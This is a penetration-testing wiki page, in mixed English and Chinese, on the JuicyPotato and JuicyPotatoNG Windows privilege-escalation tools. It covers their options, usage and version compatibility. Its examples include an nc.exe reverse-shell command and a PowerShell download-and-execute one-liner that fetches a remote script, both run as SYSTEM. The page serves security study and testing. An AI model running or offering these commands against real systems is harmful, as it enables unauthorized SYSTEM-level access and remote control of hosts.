# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato is legacy. It generally works on Windows versions up to Windows 10 1803 / Windows Server 2016. Microsoft changes shipped starting in Windows 10 1809 / Server 2019 broke the original technique. For those builds and newer, consider modern alternatives such as PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato and others. See the page below for up-to-date options and usage.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (滥用黄金权限) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_A sugared version of_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, with a bit of juice, i.e. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### You can download juicypotato from [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Compatibility quick notes

- 在当前上下文具有 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege 时，可在 Windows 10 1803 和 Windows Server 2016 上可靠运行。
- 在 Windows 10 1809 / Windows Server 2019 及更高版本中，被 Microsoft 的硬化措施破坏。对于这些版本，请优先使用上面链接的替代方案。

### Summary <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.

We decided to weaponize [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **欢迎 Juicy Potato**.

> For the theory, see [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) and follow the chain of links and references.

我们发现，除了 `BITS` 之外，还有若干可以滥用的 COM 服务。它们只需要满足：

1. 当前用户可以实例化，通常是具有模拟权限的“service user”
2. 实现 `IMarshal` 接口
3. 以提升的用户身份运行（SYSTEM、Administrator …）

经过一些测试，我们在多个 Windows 版本上获得并测试了一个广泛的 [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) 列表。

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato allows you to:

- **Target CLSID** _选择任意 CLSID。_ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _你可以在此按操作系统查看组织好的列表。_
- **COM Listening port** _定义你偏好的 COM 监听端口（替代封送时硬编码的 6666）_
- **COM Listening IP address** _将服务器绑定到任意 IP_
- **Process creation mode** _根据被模拟用户的权限，你可以从以下方式中选择：_
- `CreateProcessWithToken` (需要 `SeImpersonate`)
- `CreateProcessAsUser` (需要 `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _如果利用成功，启动可执行文件或脚本_
- **Process Argument** _自定义启动进程的参数_
- **RPC Server address** _用于更隐蔽的方式，你可以向外部 RPC 服务器进行身份验证_
- **RPC Server port** _当你想要向外部服务器进行身份验证但防火墙阻止端口 `135` 时很有用…_
- **TEST mode** _主要用于测试目的，例如测试 CLSID。它会创建 DCOM 并打印令牌的用户。参见_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### 结语 <a href="#final-thoughts" id="final-thoughts"></a>

[**摘自 juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

如果用户具有 `SeImpersonate` 或 `SeAssignPrimaryToken` 权限，那么你就是 **SYSTEM**。

几乎不可能阻止对所有这些 COM Servers 的滥用。你可以考虑通过 `DCOMCNFG` 修改这些对象的权限，但祝你好运，这会很有挑战性。

实际的解决办法是保护运行在 `* SERVICE` 账户下的敏感账户和应用程序。停止 `DCOM` 确实可以抑制该漏洞利用，但可能会对底层操作系统产生严重影响。

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG 通过组合以下方法，在现代 Windows 上重新引入了 JuicyPotato 风格的本地权限提升：

- 将 DCOM OXID 解析到所选端口的本地 RPC 服务器，避免使用旧的硬编码 127.0.0.1:6666 监听器。
- 一个 SSPI hook，用于捕获并模拟传入的 SYSTEM 认证，而无需 RpcImpersonateClient，这也在仅存在 SeAssignPrimaryTokenPrivilege 时启用了 CreateProcessAsUser。
- 用于满足 DCOM 激活约束的技巧（例如，针对 PrintNotify / ActiveX Installer Service 类时此前的 INTERACTIVE 组要求）。

重要说明（不同版本行为会演变）：
- September 2022: Initial technique worked on supported Windows 10/11 and Server targets using the “INTERACTIVE trick”.
- January 2023 update from the authors: Microsoft later blocked the INTERACTIVE trick. A different CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) restores exploitation but only on Windows 11 / Server 2022 according to their post.

基本用法（更多参数见帮助）：
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
如果你的目标是 Windows 10 1809 / Server 2019，并且 classic JuicyPotato 已被修补，建议优先使用顶部链接的替代工具（RoguePotato、PrintSpoofer、EfsPotato/GodPotato 等）。NG 可能因构建版本和服务状态而有不同表现。

## 示例

Note: Visit [this page](https://ohpe.it/juicy-potato/CLSID/) for a list of CLSIDs to try.

### 获取 nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### 启动新的 CMD（如果你有 RDP 访问）

![](<../../images/image (300).png>)

## CLSID 问题

通常，JuicyPotato 使用的默认 CLSID **不起作用**，漏洞利用会失败。通常需要多次尝试才能找到一个 **可用的 CLSID**。要获取针对特定操作系统可尝试的 CLSID 列表，请访问此页面：

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **检查 CLSID**

首先，除了 juicypotato.exe，你还需要一些可执行文件。

下载 [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) 并将其加载到你的 PS 会话中，然后下载并执行 [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)。该脚本会生成一个要测试的可能 CLSID 列表。

然后下载 [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)（更改指向 CLSID 列表和 juicypotato 可执行文件 的路径）并执行它。它会开始尝试每个 CLSID，**当端口号改变时，表示该 CLSID 生效**。

**检查** 可用的 CLSID **使用参数 -c**

## 参考资料

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
